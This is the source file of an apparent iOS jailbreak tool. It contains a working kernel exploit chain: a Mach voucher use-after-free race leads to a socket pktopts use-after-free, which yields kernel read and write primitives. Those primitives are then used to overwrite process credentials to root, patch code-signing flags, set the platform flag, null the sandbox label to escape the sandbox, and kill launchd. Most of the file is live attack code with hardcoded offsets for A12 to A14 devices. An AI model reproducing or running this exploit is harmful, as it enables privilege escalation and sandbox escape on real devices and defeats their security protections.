//
//  sandbox_util.m
//  c0met_light
//
//  Created by maverickdev1 on 17.02.2021.
//

#import <Foundation/Foundation.h>
#import "cicuta_virosa.h"
#import <mach/mach.h>
#import <sys/stat.h>
#import <sys/utsname.h>
#import <dlfcn.h>
#include <spawn.h>
#include <mach/mach.h>
#include <assert.h>
#include <stdlib.h>
#include <pthread.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/sysctl.h>
#include <errno.h>
#include "cicuta_virosa.h"
#include "voucher_utils.h"
#include "cicuta_log.h"
#include "descriptors_utils.h"
#include "fake_element_spray.h"
#include "exploit_utilities.h"
#include <sys/utsname.h>
#include <sys/mount.h>
#include <spawn.h>
#include <sys/stat.h>
#include <copyfile.h>
#include <dlfcn.h>
#include <mach/mach.h>
#include <stdio.h>
#include <sys/stat.h>
#include <sys/spawn.h>
#include <mach/mach.h>

#include <ifaddrs.h>
#include <arpa/inet.h>
#include <unistd.h>
#include "jelbrekLib.h"

extern
kern_return_t mach_vm_read_overwrite
(
    vm_map_t target_task,
    mach_vm_address_t address,
    mach_vm_size_t size,
    mach_vm_address_t data,
    mach_vm_size_t *outsize
);

extern
kern_return_t mach_vm_region_recurse
(
    vm_map_t target_task,
    mach_vm_address_t *address,
    mach_vm_size_t *size,
    natural_t *nesting_depth,
    vm_region_recurse_info_t info,
    mach_msg_type_number_t *infoCnt
);

// ---- Kernel task -------------------------------------------------------------------------------

static mach_port_t kernel_task_port;

static void
kernel_task_init() {
    task_for_pid(mach_task_self(), 0, &kernel_task_port);
    assert(kernel_task_port != MACH_PORT_NULL);
    printf("kernel task: 0x%x\n", kernel_task_port);
}

static bool
kernel_read(uint64_t address, void *data, size_t size) {
    mach_vm_size_t size_out;
    kern_return_t kr = mach_vm_read_overwrite(kernel_task_port, address, size,
            (mach_vm_address_t) data, &size_out);
    return (kr == KERN_SUCCESS);
}

static uint64_t
kernel_read64(uint64_t address) {
    uint64_t value = 0;
    bool ok = kernel_read(address, &value, sizeof(value));
    if (!ok) {
        printf("error: %s(0x%016llx)\n", __func__, address);
    }
    return value;
}

// ---- Kernel base -------------------------------------------------------------------------------

static uint64_t kernel_base;

static bool
is_kernel_base(uint64_t base) {
    uint64_t header[2] = { 0x0100000cfeedfacf, 0x0000000200000000 };
    uint64_t data[2] = {};
    bool ok = kernel_read(base, &data, sizeof(data));
    if (ok && memcmp(data, header, sizeof(data)) == 0) {
        return true;
    }
    return false;
}

static bool
kernel_base_init_with_unsafe_heap_scan() {
    uint64_t kernel_region_base = 0xfffffff000000000;
    uint64_t kernel_region_end  = 0xfffffffbffffc000;
    // Try and find a pointer in the kernel heap to data in the kernel image. We'll take the
    // smallest such pointer.
    uint64_t kernel_ptr = (uint64_t)(-1);
    mach_vm_address_t address = 0;
    for (;;) {
        // Get the next memory region.
        mach_vm_size_t size = 0;
        uint32_t depth = 2;
        struct vm_region_submap_info_64 info;
        mach_msg_type_number_t count = VM_REGION_SUBMAP_INFO_COUNT_64;
        kern_return_t kr = mach_vm_region_recurse(kernel_task_port, &address, &size,
                &depth, (vm_region_recurse_info_t) &info, &count);
        if (kr != KERN_SUCCESS) {
            break;
        }
        // Skip any region that is not on the heap, not in a submap, not readable and
        // writable, or not fully mapped.
        int prot = VM_PROT_READ | VM_PROT_WRITE;
        if (info.user_tag != 12
            || depth != 1
            || (info.protection & prot) != prot
            || info.pages_resident * 0x4000 != size) {
            goto next;
        }
        // Read the first word of each page in this region.
        for (size_t offset = 0; offset < size; offset += 0x4000) {
            uint64_t value = 0;
            bool ok = kernel_read(address + offset, &value, sizeof(value));
            if (ok
                && kernel_region_base <= value
                && value < kernel_region_end
                && value < kernel_ptr) {
                kernel_ptr = value;
            }
        }
next:
        address += size;
    }
    // If we didn't find any such pointer, abort.
    if (kernel_ptr == (uint64_t)(-1)) {
        return false;
    }
    printf("found kernel pointer %p\n", (void *)kernel_ptr);
    // Now that we have a pointer, we want to scan pages until we reach the kernel's Mach-O
    // header.
    uint64_t page = kernel_ptr & ~0x3fff;
    for (;;) {
        bool found = is_kernel_base(page);
        if (found) {
            kernel_base = page;
            return true;
        }
        page -= 0x4000;
    }
    return false;
}

static void
kernel_base_init() {
    bool ok = kernel_base_init_with_unsafe_heap_scan();
    assert(ok);
    printf("kernel base: %p\n", (void *)kernel_base);
}

// ---- Main --------------------------------------------------------------------------------------
typedef volatile struct {
    uint32_t ip_bits;
    uint32_t ip_references;
    struct {
        uint64_t data;
        uint64_t type;
    } ip_lock; // spinlock
    struct {
        struct {
            struct {
                uint32_t flags;
                uint32_t waitq_interlock;
                uint64_t waitq_set_id;
                uint64_t waitq_prepost_id;
                struct {
                    uint64_t next;
                    uint64_t prev;
                } waitq_queue;
            } waitq;
            uint64_t messages;
            uint32_t seqno;
            uint32_t receiver_name;
            uint16_t msgcount;
            uint16_t qlimit;
            uint32_t pad;
        } port;
        uint64_t klist;
    } ip_messages;
    uint64_t ip_receiver;
    uint64_t ip_kobject;
    uint64_t ip_nsrequest;
    uint64_t ip_pdrequest;
    uint64_t ip_requests;
    uint64_t ip_premsg;
    uint64_t ip_context;
    uint32_t ip_flags;
    uint32_t ip_mscount;
    uint32_t ip_srights;
    uint32_t ip_sorights;
} kport_t;
#define IPV6_USE_MIN_MTU 42
#define IPV6_PKTINFO 46
#define IPV6_PREFER_TEMPADDR 63

struct route_in6 {
    struct rtentry *ro_rt;
    struct llentry *ro_lle;
    struct ifaddr *ro_srcia;
    uint32_t ro_flags;
    struct sockaddr_in6 ro_dst;
};

struct ip6po_rhinfo {
    struct ip6_rthdr *ip6po_rhi_rthdr; /* Routing header */
    struct route_in6 ip6po_rhi_route; /* Route to the 1st hop */
};

struct ip6po_nhinfo {
    struct sockaddr *ip6po_nhi_nexthop;
    struct route_in6 ip6po_nhi_route; /* Route to the nexthop */
};

struct ip6_pktopts {
    struct mbuf *ip6po_m;
    int ip6po_hlim;
    struct in6_pktinfo *ip6po_pktinfo;
    struct ip6po_nhinfo ip6po_nhinfo;
    struct ip6_hbh *ip6po_hbh;
    struct ip6_dest *ip6po_dest1;
    struct ip6po_rhinfo ip6po_rhinfo;
    struct ip6_dest *ip6po_dest2;
    int ip6po_tclass;
    int ip6po_minmtu;
    int ip6po_prefer_tempaddr;
    int ip6po_flags;
};

#define IO_BITS_ACTIVE      0x80000000
#define IOT_PORT            0
#define IKOT_TASK           2
#define IKOT_CLOCK          25
#define IKOT_IOKIT_CONNECT  29

typedef volatile struct {
    uint32_t ip_bits;
    uint32_t ip_references;
    struct {
        uint64_t data;
        uint64_t type;
    } ip_lock; // spinlock
    struct {
        struct {
            struct {
                uint32_t flags;
                uint32_t waitq_interlock;
                uint64_t waitq_set_id;
                uint64_t waitq_prepost_id;
                struct {
                    uint64_t next;
                    uint64_t prev;
                } waitq_queue;
            } waitq;
            uint64_t messages;
            uint32_t seqno;
            uint32_t receiver_name;
            uint16_t msgcount;
            uint16_t qlimit;
            uint32_t pad;
        } port;
        uint64_t klist;
    } ip_messages;
    uint64_t ip_receiver;
    uint64_t ip_kobject;
    uint64_t ip_nsrequest;
    uint64_t ip_pdrequest;
    uint64_t ip_requests;
    uint64_t ip_premsg;
    uint64_t ip_context;
    uint32_t ip_flags;
    uint32_t ip_mscount;
    uint32_t ip_srights;
    uint32_t ip_sorights;
};

typedef struct {
    struct {
        uint64_t data;
        uint32_t reserved : 24,
        type     :  8;
        uint32_t pad;
    } lock; // mutex lock
    uint32_t ref_count;
    uint32_t active;
    uint32_t halting;
    uint32_t pad;
    uint64_t map;
} ktask_t;

#define WQT_QUEUE               0x2
#define _EVENT_MASK_BITS        ((sizeof(uint32_t) * 8) - 7)

union waitq_flags {
    struct {
        uint32_t /* flags */
    waitq_type:2,    /* only public field */
    waitq_fifo:1,    /* fifo wakeup policy? */
    waitq_prepost:1, /* waitq supports prepost? */
    waitq_irq:1,     /* waitq requires interrupts disabled */
    waitq_isvalid:1, /* waitq structure is valid */
    waitq_turnstile_or_port:1, /* waitq is embedded in a turnstile (if irq safe), or port (if not irq safe) */
    waitq_eventmask:_EVENT_MASK_BITS;
    };
    uint32_t flags;
};
static kern_return_t extract_voucher_content(mach_port_t voucher, void* out, uint32_t* out_size)
{
    kern_return_t mach_voucher_extract_attr_content(ipc_voucher_t voucher, mach_voucher_attr_key_t key,
        mach_voucher_attr_content_t content, mach_msg_type_number_t *contentCnt);
    return mach_voucher_extract_attr_content(voucher, MACH_VOUCHER_ATTR_KEY_USER_DATA, out, out_size);
}

static kern_return_t extract_voucher_recipes(mach_port_t voucher, void* out, uint32_t* out_size)
{
    kern_return_t
    mach_voucher_extract_all_attr_recipes(
        ipc_voucher_t                                   voucher,
        mach_voucher_attr_raw_recipe_array_t            recipes,
        mach_voucher_attr_raw_recipe_array_size_t       *in_out_size);
    return mach_voucher_extract_all_attr_recipes(voucher, out, out_size);
}

struct redeem_race_context
{
    mach_port_t target;
    uint32_t tries;
    int* start_flag;
};

struct element_uaf_race_context
{
    mach_port_t target;
    uint64_t id;
    int* start_flag;
    mach_voucher_attr_recipe_t recipe;
};

kern_return_t redeem_voucher(ipc_voucher_t target, ipc_voucher_t* result)
{
    mach_voucher_attr_recipe_data_t recipe = {
        .key = MACH_VOUCHER_ATTR_KEY_USER_DATA,
        .command = MACH_VOUCHER_ATTR_REDEEM,
        .previous_voucher = target
    };

    return create_voucher(&recipe, result);
}

static void* redeem_voucher_thread(void* context)
{
    volatile struct redeem_race_context* redeem_context = context;
    uint32_t tries = redeem_context->tries;
    ipc_voucher_t voucher = MACH_PORT_NULL;

    while (!*redeem_context->start_flag){}

    for (uint32_t i = 0; i < tries; ++i)
    {
        kern_return_t kr = redeem_voucher(redeem_context->target, &voucher);
        assert(kr == KERN_SUCCESS);
    }

    return NULL;
}

static void* destroy_voucher_thread(void* context)
{
    volatile struct element_uaf_race_context* uaf_context = context;
    ipc_voucher_t target = uaf_context->target;
    while (!*uaf_context->start_flag){}
    destroy_voucher(target);
    return NULL;
}

static void* create_voucher_thread(void* context)
{
    volatile struct element_uaf_race_context* uaf_context = context;
    mach_voucher_attr_recipe_t recipe = uaf_context->recipe;
    ipc_voucher_t* voucher = malloc(sizeof(ipc_voucher_t));
    *voucher = IPC_VOUCHER_NULL;
    while (!*uaf_context->start_flag){}
    assert(create_voucher(recipe, voucher) == KERN_SUCCESS);
    return voucher;
}

#define REDEEM_RACERS_COUNT 2
pthread_t* redeem_racers = NULL;

void perform_e_made_dropping_race(struct redeem_race_context* context)
{
    *context->start_flag = 0;
    for (int i = 0; i < REDEEM_RACERS_COUNT; ++i)
    {
        pthread_create(&redeem_racers[i], 0, redeem_voucher_thread, context);
    }

    *context->start_flag = 1;
    for (int i = 0; i < REDEEM_RACERS_COUNT; ++i)
    {
        pthread_join(redeem_racers[i], NULL);
    }
}

ipc_voucher_t perform_user_data_element_uaf_race(uint64_t id)
{
    struct element_uaf_race_context context;
    context.id = id;
    context.recipe = create_recipe_for_user_data_voucher(id);
    assert(create_voucher(context.recipe, &context.target) == KERN_SUCCESS);
    context.start_flag = malloc(sizeof(int));

    pthread_t destroy = NULL;
    pthread_t create = NULL;
    ipc_voucher_t* new_voucher  = NULL;
    uint64_t content[DATA_VOUCHER_CONTENT_SIZE / 8];
    uint32_t out_size = sizeof(content);

    for (uint32_t i = 1; i < 500; ++i)
    {
        *context.start_flag = 0;
        pthread_create(&destroy, 0, destroy_voucher_thread, &context);
        pthread_create(&create, 0, create_voucher_thread, &context);
        *context.start_flag = 1;
        pthread_join(destroy, NULL);
        pthread_join(create, (void**)&new_voucher);
        context.target = *new_voucher;
        free(new_voucher);
        kern_return_t kr = extract_voucher_content(context.target, content, &out_size);
        if (kr == 0x10000003)
        {
            assert(create_voucher(context.recipe, &context.target) == KERN_SUCCESS);
        }
        else if (kr == KERN_NO_SPACE || out_size != sizeof(content))
        {
            cicuta_log("perform_user_data_element_uaf_race: success on %u iteration", i);
            return context.target;
        }
    }

    destroy_voucher(context.target);
    return IPC_VOUCHER_NULL;
}


#define RW_SOCKETS 128

int rw_sockets[RW_SOCKETS];

static int get_pktinfo(int sock, struct in6_pktinfo *pktinfo) {
    socklen_t size = sizeof(*pktinfo);
    return getsockopt(sock, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, &size);
}

int kread_write_sock = - 1;

uint64_t read_64(uint64_t addr)
{
    fake_element_spray_set_pktopts(addr);
    perform_fake_element_spray();
    uint64_t buf[3] = {0};
    get_pktinfo(kread_write_sock, (void*)buf);
    return buf[0];
}
uint32_t kread(uint64_t addr,void* lok,size_t size)
{
    fake_element_spray_set_pktopts(addr);
    perform_fake_element_spray();
  
    uint32_t buf[5] = {0};
    get_pktinfo(kread_write_sock, (void*)buf);
    return buf[0];
}
uint32_t read_32(uint64_t addr)
{
    fake_element_spray_set_pktopts(addr);
    perform_fake_element_spray();
    uint32_t buf[5] = {0};
    get_pktinfo(kread_write_sock, (void*)buf);
    return buf[0];
}

void write_20(uint64_t addr, const void* buf)
{
    fake_element_spray_set_pktopts(addr);
    perform_fake_element_spray();
    setsockopt(kread_write_sock, IPPROTO_IPV6, IPV6_PKTINFO, buf, 20);
}

void write_32(uint64_t addr, const void* buf){
    fake_element_spray_set_pktopts(addr);
    perform_fake_element_spray();
    setsockopt(kread_write_sock, IPPROTO_IPV6, IPV6_PKTINFO, buf, 32);
}

void write_64(uint64_t addr, const void* buf){
    fake_element_spray_set_pktopts(addr);
    perform_fake_element_spray();
    setsockopt(kread_write_sock, IPPROTO_IPV6, IPV6_PKTINFO, buf, 64);
}


kern_return_t mach_vm_allocate
(
 vm_map_t target,
 mach_vm_address_t *address,
 mach_vm_size_t size,
 int flags
 );

kern_return_t mach_vm_write
(
 vm_map_t target_task,
 mach_vm_address_t address,
 vm_offset_t data,
 mach_msg_type_number_t dataCnt
 );


kern_return_t mach_vm_read_overwrite(vm_map_t target_task, mach_vm_address_t address, mach_vm_size_t size, mach_vm_address_t data, mach_vm_size_t *outsize);
kern_return_t mach_vm_region(vm_map_t target_task, mach_vm_address_t *address, mach_vm_size_t *size, vm_region_flavor_t flavor, vm_region_info_t info, mach_msg_type_number_t *infoCnt, mach_port_t *object_name);
mach_port_t fill_kalloc_with_port_pointer(uint64_t proc, int count, int disposition) {
    mach_port_t q = MACH_PORT_NULL;
    kern_return_t err;
    err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &q);
    if (err != KERN_SUCCESS) {
        printf("[-] failed to allocate port\n");
        return 0;
    }
    
    mach_port_t* ports = malloc(sizeof(mach_port_t) * count);
    for (int i = 0; i < count; i++) {
        ports[i] = proc;
    }
    
    struct ool_msg* msg = (struct ool_msg*)calloc(1, sizeof(struct ool_msg));
    
    msg->hdr.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
    msg->hdr.msgh_size = (mach_msg_size_t)sizeof(struct ool_msg);
    msg->hdr.msgh_remote_port = q;
    msg->hdr.msgh_local_port = MACH_PORT_NULL;
    msg->hdr.msgh_id = 0x41414141;
    
    msg->body.msgh_descriptor_count = 1;
    
    msg->ool_ports.address = ports;
    msg->ool_ports.count = count;
    msg->ool_ports.deallocate = 0;
    msg->ool_ports.disposition = disposition;
    msg->ool_ports.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
    msg->ool_ports.copy = MACH_MSG_PHYSICAL_COPY;
    
    err = mach_msg(&msg->hdr,
                   MACH_SEND_MSG|MACH_MSG_OPTION_NONE,
                   msg->hdr.msgh_size,
                   0,
                   MACH_PORT_NULL,
                   MACH_MSG_TIMEOUT_NONE,
                   MACH_PORT_NULL);
    
    if (err != KERN_SUCCESS) {
        printf("[-] failed to send message: %s\n", mach_error_string(err));
        return MACH_PORT_NULL;
    }
    
    return q;
}
int set_minmtu(int sock, int *minmtu) {
    return setsockopt(sock, IPPROTO_IPV6, IPV6_USE_MIN_MTU, minmtu, sizeof(*minmtu));
}

int get_minmtu(int sock, int *minmtu) {
    socklen_t size = sizeof(*minmtu);
    return getsockopt(sock, IPPROTO_IPV6, IPV6_USE_MIN_MTU, minmtu, &size);
}

int get_prefertempaddr(int sock, int *prefertempaddr) {
    socklen_t size = sizeof(*prefertempaddr);
    return getsockopt(sock, IPPROTO_IPV6, IPV6_PREFER_TEMPADDR, prefertempaddr, &size);
}

int set_prefertempaddr(int sock, int *prefertempaddr) {
    return setsockopt(sock, IPPROTO_IPV6, IPV6_PREFER_TEMPADDR, prefertempaddr, sizeof(*prefertempaddr));
}



int set_pktinfo(int sock, struct in6_pktinfo *pktinfo) {
    return setsockopt(sock, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, sizeof(*pktinfo));
}

// free the pktopts struct of the socket to get ready for UAF
int free_socket_options(int sock) {
    return disconnectx(sock, 0, 0);
}

// return a socket we can UAF on
int get_socket() {
    int sock = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);
    if (sock < 0) {
        printf("[-] Can't get socket, error %d (%s)\n", errno, strerror(errno));
        return -1;
    }
    
    // allow setsockopt() after disconnect()
    struct so_np_extensions sonpx = {.npx_flags = SONPX_SETOPTSHUT, .npx_mask = SONPX_SETOPTSHUT};
    int ret = setsockopt(sock, SOL_SOCKET, SO_NP_EXTENSIONS, &sonpx, sizeof(sonpx));
    if (ret) {
        printf("[-] setsockopt() failed, error %d (%s)\n", errno, strerror(errno));
        return -1;
    }
    
    return sock;
}
uint64_t cicuta_virosa(void) {
    int* race_flag = malloc(sizeof(int));
       struct redeem_race_context* context = malloc(sizeof(struct redeem_race_context));
       context->start_flag = race_flag;
       context->tries = 256;
       uint64_t id = 0;
       redeem_racers = calloc(1, REDEEM_RACERS_COUNT * sizeof(pthread_t));
       increase_limits(10240);

       cicuta_log("Stage 1: race for voucher ivace uaf");

   init_exploit:
       init_fake_element_spray(0x1400 - 0x10, 1024);
    

   stage1:
       create_user_data_voucher_fast(id, &context->target);
       for (uint32_t i = 0; i < 256; ++i)
       {
           perform_e_made_dropping_race(context);
       }

       ipc_voucher_t uafed_voucher = perform_user_data_element_uaf_race(id);
       if (uafed_voucher == IPC_VOUCHER_NULL)
       {
           ++id;
           goto stage1;
       }

       perform_fake_element_spray();
       cicuta_log("uafed_voucher: %u", uafed_voucher);
       cicuta_log("Stage 2: leak task port address and overlapped index");

       uint32_t recipe_size = 0x1400;
       uint32_t* recipe = malloc(recipe_size);

       if (extract_voucher_recipes(uafed_voucher, recipe, &recipe_size) != KERN_SUCCESS)
       {
           cicuta_log("Cannot extract fake element content!");
           release_all_fake_element_spray();
           free(recipe);
           goto init_exploit;
       }

       uint32_t* dump = recipe + 4;
       uint32_t spray_magic = FAKE_ELEMENT_MAGIC_BASE >> 32;
       if (recipe_size != 0x1400 || dump[1] != spray_magic)
       {
           cicuta_log("Bad fake element dump!");
           release_all_fake_element_spray();
           free(recipe);
           goto init_exploit;
       }

       cicuta_log("Got fake element dump!");
       uint32_t overlapped_index = dump[0];
       cicuta_log("Overlapped index: %u", overlapped_index);

       uint32_t* next_spray_entry = memmem(dump + 2, 0x1400 - 6 * sizeof(uint32_t), &spray_magic, sizeof(spray_magic));
       if (next_spray_entry == NULL)
       {
           cicuta_log("Cannot find next spray entry");
           release_all_fake_element_spray();
           free(recipe);
           goto init_exploit;
       }

       uint32_t next_spray_index = *(next_spray_entry - 1);
       cicuta_log("Next spray index: %u", next_spray_index);

   #define OOL_PORTS_SPRAY 128

       mach_port_t* ports = malloc(OOL_PORTS_SPRAY * sizeof(mach_port_t));
       memset(ports, 0, OOL_PORTS_SPRAY * sizeof(mach_port_t));

       for(uint32_t i = 0; i < OOL_PORTS_SPRAY; ++i)
       {
           ports[i] = new_mach_port();
       }

       release_fake_element_spray_at(next_spray_index);
       for (uint32_t i = 0; i < OOL_PORTS_SPRAY; ++i)
       {
           send_ool_ports(ports[i], mach_task_self(), (DATA_VOUCHER_CONTENT_SIZE + USER_DATA_ELEMENT_SIZEOF) / sizeof(uint64_t), MACH_MSG_TYPE_COPY_SEND);
       }

       extract_voucher_recipes(uafed_voucher, recipe, &recipe_size);
       uint64_t task_port = *(uint64_t*)(next_spray_entry + 1);
       cicuta_log("task_port: 0x%llx", task_port);
    if(task_port==0x0){
        return 69;
    }
       set_fake_queue_chain_for_fake_element_spray(task_port + offsetof(kport_t, ip_context) - 24, task_port + offsetof(kport_t, ip_context) - 16);

       cicuta_log("Stage 3: Convert uaf into pktopts uaf");
       ipc_voucher_t redeemed_voucher = IPC_VOUCHER_NULL;
       for (uint32_t i = 1; i < 167777280; ++i)
       {
           assert(redeem_voucher(uafed_voucher, &redeemed_voucher) == KERN_SUCCESS);
       }

       cicuta_log("Respray fake user_data_element");
       fake_element_spray_set_e_size(DATA_VOUCHER_CONTENT_SIZE);
       perform_fake_element_spray();

       for (uint32_t i = 0; i < RW_SOCKETS; ++i)
       {
           rw_sockets[i] = socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
       }

       cicuta_log("Destroy uafed voucher...");
       destroy_voucher(uafed_voucher);

       for (uint32_t i = 0; i < RW_SOCKETS; ++i)
       {
           int minmtu = -1;
           int res = setsockopt(rw_sockets[i], IPPROTO_IPV6, IPV6_USE_MIN_MTU, &minmtu, sizeof(minmtu));
           if (res != 0)
           {
               cicuta_log("Cannot preallocate pktopts at %d. Error: %d", i, errno);
           }
       }

       fake_element_spray_set_pktopts(task_port + 0x68);
       perform_fake_element_spray();

       uint64_t buf[3] = {0};
       for (uint32_t i = 0; i < RW_SOCKETS; ++i)
       {
           get_pktinfo(rw_sockets[i], (void*)buf);
           if (buf[0] != 0)
           {
               kread_write_sock = rw_sockets[i];
               break;
           }
       }

       if (kread_write_sock == -1)
       {
           goto err;
       }

       cicuta_log("Established custom r/w primitives!");
       cicuta_log("Stage 4 (DEMO): pwn kernel");

   // offsets is hardcoded for A12-14!!! Change it for your device!!!
       uint64_t task_pac = buf[0];
       cicuta_log("task PAC: 0x%llx", task_pac);
       uint64_t task = task_pac | 0xffffff8000000000;
       cicuta_log("PAC decrypt: 0x%llx -> 0x%llx", task_pac, task);
       uint64_t proc_pac = read_64(task + 0x3A0);
       cicuta_log("proc PAC: 0x%llx", proc_pac);
       uint64_t proc = proc_pac | 0xffffff8000000000;
       cicuta_log("PAC decrypt: 0x%llx -> 0x%llx", proc_pac, proc);
       uint64_t ucred_pac = read_64(proc + 0xf0);
       cicuta_log("ucred PAC: 0x%llx", ucred_pac);
       uint64_t ucred = ucred_pac | 0xffffff8000000000;
       cicuta_log("PAC decrypt: 0x%llx -> 0x%llx", ucred_pac, ucred);

       cicuta_log("Overwriting kernel credentials :)");
       uint32_t creds[5] = {0, 0, 0, 1, 0};
    printf("[+] patching custom privimites\n");
    write_20(ucred + 0x18, (void*)creds); //uid
    write_32(ucred + 0x68, (void*)creds); //gid
    uint32_t ruid=read_32(ucred + 0x30);
    printf("NON-PATCHED off_ucred_cr_ruid -> %d\n",ruid);
    write_32(ucred + 0x30, (void*) creds); //ruid

    printf("PATCHED off_ucred_cr_ruid -> %d\n",ruid);
    
    uint32_t p_gid=read_32(proc + 0x2C);
    printf("NON-PATCHED p_gid -> %d\n",p_gid);
    write_20(proc + 0x30, (void*) creds); //p_gid

    printf("PATCHED p_gid -> %d\n",p_gid);
    
    uint32_t pr_gid=read_32(proc + 0x34);
    printf("NON-PATCHED off_p_rgid -> %d\n",pr_gid);
    write_20(proc + 0x30, (void*) creds); //p_gid

    printf("PATCHED off_p_rgid -> %d\n",pr_gid);
    
    uint32_t off_ucred_cr_svuid=read_32(ucred + 0x20);
    printf("NON-PATCHED cr_svuid -> %d\n",off_ucred_cr_svuid);
    write_32(ucred + 0x20, (void*) creds); //ruid

    printf("PATCHED cr_svuid -> %d\n",off_ucred_cr_svuid);
    
    uint32_t off_ucred_cr_groups=read_32(ucred + 0x28);
    printf("NON-PATCHED cr_groups -> %d\n",off_ucred_cr_groups);
    write_32(ucred + 0x28, (void*) creds); //ruid

    printf("PATCHED cr_groups -> %d\n",off_ucred_cr_groups);
    
    
    uint32_t off_ucred_cr_svgid=read_32(ucred + 0x6c);
    printf("NON-PATCHED off_ucred_cr_svgid -> %d\n",off_ucred_cr_svgid);
    write_32(ucred + 0x6c, (void*) creds); //ruid

    printf("PATCHED off_ucred_cr_svgid -> %d\n",off_ucred_cr_svgid);
        
    printf("looks like this step is clear\n");
    uint64_t c_la_pac = read_64(ucred + 0x78);
    uint64_t label = c_la_pac | 0xffffff8000000000;
    uint64_t entitlemenets=read_64(label + 0x8); //amfi_slot
    printf("[+] Entitlements -> 0x%llx\n",entitlemenets);
    
    mach_port_t port;
      kern_return_t rv = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
      if (rv) {
          printf("[-] Failed to allocate port (%s)\n", mach_error_string(rv));
          return MACH_PORT_NULL;
      }
      rv = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
      if (rv) {
          printf("[-] Failed to insert right (%s)\n", mach_error_string(rv));
          return MACH_PORT_NULL;
      }
    
    printf("new port: 0x%llx",port);
   
    cicuta_log("\n[!] patching priviliges -> rootify14");
    setuid(0);
    sleep(1);
    printf("\n...\n");

    //write_20(ucred + 0x68,  (void*)creds); //rgid
    
    sleep(1);
    cicuta_log("....\n");
    //write_20(ucred + 0x1c, (void*)creds); //ruid
   
     //svgid
    cicuta_log("\n.\n");
    //write_20(ucred + 0x78, (void*)creds); // cr_label
    
    
   
    printf("now lets set csflags...");
    //0x290 csflags
    uint32_t csFlags=read_32(proc +0x290);
    sleep(3);
    printf("\nCSFLAGS OLD -> 0x%llx",csFlags);
    sleep(3);
    csFlags=(csFlags|0xA8|0x0000008|0x0000004|0x10000000)&~(0x0000800|0x0000100|0x0000200);
    write_32(proc +0x290, (void*)csFlags);
    printf("\nCSFLAGS PATCHED -> 0x%llx\n",csFlags);
    sleep(4);
    printf("patched cs are you still alive?");
    
    sleep(2);
    uint32_t realtf=0;

    uint32_t t_flag=read_32(task + 0x3A0);
    realtf=t_flag;

    printf("\n[*] Platformization Step\n");

    sleep(2);
    t_flag|=0x400;
    write_32(task+0x3A0, &t_flag);
    write_32(proc + 0x290, csFlags|0x24004001u);
   
    if(t_flag==realtf){
        
    }else{
        printf("TF_PLATFORM original %d\nTF_PLATFORM patched -> %d\n",realtf,t_flag);
        printf("TF_PLATFORM original %d\nTF_PLATFORM patched -> %d\n",realtf,t_flag);
    }
    uint64_t self_port_addr;
    
    printf("[*] amfid, this shit is a pretty important part\n");
    printf("socket -> 0x%x\n",get_socket());
   
    
   
    return task_pac;
err:
    free(redeem_racers);
    cicuta_log("Out.");
    return 0;
}



uint64_t root_patch(uint64_t task_pac){

    uint64_t task = task_pac | 0xffffff8000000000;



    uint64_t proc_pac = read_64(task + 0x3A0);

      
    uint64_t proc = proc_pac | 0xffffff8000000000;
      
    uint64_t ucred_pac = read_64(proc + 0xf0);
      
    uint64_t ucred = ucred_pac | 0xffffff8000000000;
    uint64_t c_la_pac = read_64(ucred + 0x78);
    uint64_t label = c_la_pac | 0xffffff8000000000;
    uint32_t fake_data_[2] = {0, 1};
    uint32_t fake_data_one[5] = {1, 0, 0, 0, 0};
    write_32(ucred + 0x1c, (void*)fake_data_);
    write_32(ucred + 0x20, (void*)fake_data_);
    //write_32(ucred + 0x24, (void*)fake_data_one);
    //write_32(ucred + 0x28, (void*)fake_data_);
    write_20(ucred + 0x68, (void*)fake_data_);
    write_32(ucred + 0x6c, (void*)fake_data_);
    write_32(ucred + 0x6c, (void*)fake_data_);
    //printf("\noff_ucred_cr_rgid -> %d",getgid());
    if(getgid()==0){
   
        return 0;
    }else{
        
    }
    return 3;
}

uint64_t SetupLinks(){
    mkdir("/var/mobile/LIB/dropbear", 0777);
    chmod("/var/mobile/LIB/dropbear", 0777);
    if(symlink("/var/mobile/LIB", "/var/LIB")){
        printf("[+] symlinked -> /var/mobile/LIB /var/LIB");
    }
    kill(1, SIGKILL);
    return 0;
}
 
uint64_t disable_sandbox(uint64_t task_pac){
  
uint64_t task = task_pac | 0xffffff8000000000;



uint64_t proc_pac = read_64(task + 0x3A0);

  
uint64_t proc = proc_pac | 0xffffff8000000000;
  
uint64_t ucred_pac = read_64(proc + 0xf0);
  
uint64_t ucred = ucred_pac | 0xffffff8000000000;

   
uint64_t c_la_pac = read_64(ucred + 0x78);
uint64_t label = c_la_pac | 0xffffff8000000000;
    uint32_t nullified_val[5]={0,0,0,1,0};
    write_20(label + 0x10, (void*)nullified_val); //0x10 -> off_sandbox_slot
    
    FILE *f = fopen("/var/mobile/.sandboxtest", "w");

    if(f){
        printf("[+] Sandbox escaped -> 1");
        root_patch(task);
        setgid(0);
        setuid(0);
        uint32_t uid = getuid();
        uint32_t gid = getgid();
        cicuta_log("getuid() returns %u", uid);
        cicuta_log("getgid() returns %u", gid);
        cicuta_log("uid: %s", uid == 0 ? "root" : "mobile");
        cicuta_log("gid: %s", gid == 0 ? "root" : "mobile");
        //platformize14(task);
        printf("\ncleanup...");
        
      
        return 1; // ret=unsandboxed;
        
    }else{
        printf("[+] Failed to escape sandbox. something patched? -> 0");
    }
    return 0;
}
